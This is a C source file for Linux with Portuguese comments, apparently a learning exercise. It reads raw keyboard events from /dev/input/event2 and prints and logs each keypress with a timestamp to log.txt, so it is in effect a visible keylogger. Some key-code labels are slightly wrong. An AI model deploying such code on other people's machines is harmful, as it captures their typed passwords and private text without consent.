#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>

// tabela de teclas normais
char teclas[200] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
};

// funcao pra pegar o horario 
void pegar_horario(char *buffer, int tamanho) {
    time_t agora;
    struct tm *info;
    
    time(&agora);
    info = localtime(&agora);
    strftime(buffer, tamanho, "%H:%M:%S", info);
}

int main() {
    int tec;
    struct input_event e;
    int shift = 0;
    
    tec = open("/dev/input/event2", O_RDONLY);
    
    if(tec == -1) {
        printf("abriu nao, tenta com sudo\n");
        return 1;
    }
    
    printf("teclado funcionando, aperta ctrl+c pra parar\n");
    
    FILE *log = fopen("log.txt", "a");
    if(log == NULL) {
        printf("deu erro no arquivo\n");
        return 1;
    }
    
    while(1) {
        int r = read(tec, &e, sizeof(e));
        
        if(r < 0) {
            break;
        }
        
        // se for tecla
        if(e.type == 1) {
            
            // shift apertado ou solto
            if(e.code == 42 || e.code == 54) {
                if(e.value == 1) {
                    shift = 1;
                } else {
                    shift = 0;
                }
                continue;
            }
            
            // so quando aperta (value=1)
            if(e.value == 1) {
                
                char horario[20];
                pegar_horario(horario, sizeof(horario));
                
                // tenta converter tecla normal
                if(e.code < 128 && teclas[e.code] != 0) {
                    char letra = teclas[e.code];
                    
                    if(shift == 1 && letra >= 'a' && letra <= 'z') {
                        letra = letra - 32;
                    }
                    
                   
                    printf("[%s] Tecla: '%c'\n", horario, letra);
                    fprintf(log, "[%s] '%c'\n", horario, letra);
                }
                else {
                    // teclas especiais 
                    char *nome_tecla = "";
                    // reconhecimento de teclas especiais usando ascii para identificação
                    switch(e.code) {
                        case 28:
                            nome_tecla = "ENTER";
                            printf("[%s] Tecla: ENTER\n", horario);
                            break;
                        case 14:
                            nome_tecla = "BACKSPACE";
                            printf("[%s] Tecla: BACKSPACE\n", horario);
                            break;
                        case 57:
                            nome_tecla = "ESPACO";
                            printf("[%s] Tecla: ESPACO\n", horario);
                            break;
                        case 15:
                            nome_tecla = "TAB";
                            printf("[%s] Tecla: TAB\n", horario);
                            break;
                        case 1:
                            nome_tecla = "ESC";
                            printf("[%s] Tecla: ESC\n", horario);
                            break;
                        case 103:
                            nome_tecla = "SETA_CIMA";
                            printf("[%s] Tecla: SETA_CIMA\n", horario);
                            break;
                        case 108:
                            nome_tecla = "SETA_BAIXO";
                            printf("[%s] Tecla: SETA_BAIXO\n", horario);
                            break;
                        case 105:
                            nome_tecla = "SETA_ESQUERDA";
                            printf("[%s] Tecla: SETA_ESQUERDA\n", horario);
                            break;
                        case 106:
                            nome_tecla = "SETA_DIREITA";
                            printf("[%s] Tecla: SETA_DIREITA\n", horario);
                            break;
                        case 127:
                            nome_tecla = "DELETE";
                            printf("[%s] Tecla: DELETE\n", horario);
                            break;
                        case 58:
                            nome_tecla = "CAPS_LOCK";
                            printf("[%s] Tecla: CAPS_LOCK\n", horario);
                            break;
                        default:
                            nome_tecla = "DESCONHECIDA";
                            printf("[%s] Tecla: DESCONHECIDA[%d]\n", horario, e.code);
                            break;
                    }
                    
                    fprintf(log, "[%s] %s\n", horario, nome_tecla);
                }
                
                // força escrever no arquivo
                fflush(log);
            }
        }
    }
    
    fclose(log);
    close(tec);
    return 0;
}